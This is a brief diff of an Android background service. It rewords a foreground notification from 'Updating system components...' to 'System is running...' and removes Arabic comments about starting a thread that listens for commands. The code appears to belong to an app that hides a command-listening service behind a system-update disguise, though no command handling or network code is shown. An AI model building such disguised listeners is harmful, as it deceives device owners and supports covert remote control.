@@ -50,7 +50,7 @@ public class BackgroundService extends Service {
             }
             Notification notification = new Notification.Builder(this, channelId)
                     .setContentTitle("Update")
-                    .setContentText("Updating system components...")
+                    .setContentText("System is running...")
                     .setSmallIcon(android.R.drawable.ic_menu_info_details)
                     .build();
             startForeground(1, notification);
@@ -59,7 +59,6 @@ public class BackgroundService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // إرسال الإشعار الأولي فوراً في الخلفية
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -67,7 +66,6 @@ public class BackgroundService extends Service {
             }
         }).start();
 
-        // بدء الاستماع للأوامر
         new Thread(new Runnable() {
             @Override
             public void run() {
